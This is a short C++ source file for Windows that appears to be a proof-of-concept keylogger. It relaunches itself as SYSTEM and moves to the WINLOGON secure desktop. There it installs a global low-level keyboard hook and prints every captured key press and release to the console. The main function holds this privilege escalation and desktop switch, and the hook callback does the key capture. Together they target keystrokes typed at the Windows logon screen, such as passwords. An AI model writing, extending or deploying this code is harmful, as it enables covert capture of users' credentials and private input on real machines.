#include <iostream>
#include <windows.h>
#include "functions.h"

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);
	char keyName[64];
	GetKeyNameTextA(msg, keyName, 64);
	char keyState[16];
	switch (wParam)
	{
	case WM_KEYUP:
		strncpy_s(keyState, "Key Up\0", 16);
		break;
	case WM_KEYDOWN:
		strncpy_s(keyState, "Key Down\0", 16);
		break;
	case WM_SYSKEYUP:
		strncpy_s(keyState, "Sys Key Up\0", 16);
		break;
	case WM_SYSKEYDOWN:
		strncpy_s(keyState, "Sys Key Down\0", 16);
		break;
	}
	printf("Captured: %s \t %s\n", keyName, keyState);
	return CallNextHookEx(0, nCode, wParam, lParam);;
}


int main()
{
	bool IsRunningAsSystem = isRunningAsSystem();

	{
		if (!IsRunningAsSystem) if (!RelaunchAsSystem(GetCommandLineW()))
		{
			std::cout << "Failed to relaunch as system!\n";
		}
		else return 0;
	}

	if (GetCurrentDesktopName() == L"Default") if (!RelaunchWithWINLOGONDesktop(GetCommandLineW()))
	{
		std::cout << "Failed to relaunch with WINLOGON Desktop!\n";
	}
	else return 0;

	DisableBlinkingCursor();

	std::cout << (IsRunningAsSystem ? "Currently running as SYSTEM!\n" : "Not running as SYSTEM! Relaunching as SYSTEM..\n");
	std::wcout << L"Current desktop name: \"" << GetCurrentDesktopName() << "\"\n\n";

	SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0));

	system("pause");
}